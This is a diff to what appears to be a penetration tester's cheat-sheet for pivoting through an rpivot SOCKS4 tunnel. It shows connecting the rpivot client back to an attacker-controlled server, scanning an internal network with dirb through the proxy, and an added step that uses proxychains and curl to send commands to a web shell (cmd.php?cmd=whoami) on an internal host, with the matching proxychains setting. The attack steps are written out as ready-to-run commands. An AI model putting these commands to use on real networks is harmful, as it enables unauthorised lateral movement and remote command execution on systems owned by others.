@@ -12,3 +12,10 @@ python client.py --server-ip <attacker-ip-reachable-from-this-target> --server-p
 #Nmap sucks over socks4, dont bother. Use your pivot machine for that instead (you can do a tcp iterator if nmap is not available)
 #dirb'y boi, dont forget the proxy needs "socks4://", not just the IP, because reasons
 dirb <target in pivot net> /usr/share/wordlists/dirb/small.txt -p socks4://127.0.0.1
+
+#proxychains works with rpivot:
+proxychains curl http:/10.1.1.1/cmd.php?cmd=whoami
+#needs the [ProxyList] to be changed to (spaces only, no tabs):
+socks4 127.0.0.1 1080 
+
+#Allows for regular commands to be passed against boxes across the socks tunnel
